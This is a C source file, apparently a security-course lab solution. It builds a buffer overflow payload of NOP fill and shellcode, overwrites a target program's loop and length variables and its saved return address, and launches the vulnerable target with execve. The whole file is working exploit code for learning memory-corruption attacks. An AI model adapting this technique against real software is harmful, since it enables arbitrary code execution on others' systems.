#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target4"

int main(void)
{
	char *args[3];
	char *env[1];

	char sploit_str[189];

	char buf_addr[] = "\xf0\xfd\x21\x20";
	// Variable "i" is located 0xAC away from start of "buf"
	// Variable "len" is located 0xA8 away from start of "buf"

	// Fill sploit string with NOP
	int i = 0;
	for (; i < 189; ++i)
	{
		sploit_str[i] = NOP;
	}

	// Attach the shellcode to the beginning
	for (i = 0; i < strlen(shellcode); ++i)
	{
		sploit_str[i] = shellcode[i];
	}

	// overwrite len
	strcpy(&sploit_str[172], "\xff\x55\x55\x55");

	// overwrite i so that 16 char after 172 (to 188 is going to be overwrited)
	strcpy(&sploit_str[168], "\xf0\x55\x55\x55");

	// return addr
	strcpy(&sploit_str[184], buf_addr);

	// Remove EOF character
	sploit_str[188] = NOP;
	sploit_str[176] = NOP;

	for (i = 0; i < 188;){
		printf("%x\n", *(unsigned long *) &sploit_str[i]);
		i = i + 4;
	}

	args[0] = TARGET;
	args[1] = sploit_str;
	args[2] = NULL;

	env[0] = NULL;

	if (0 > execve(TARGET, args, env))
		fprintf(stderr, "execve failed.\n");

	return 0;
}
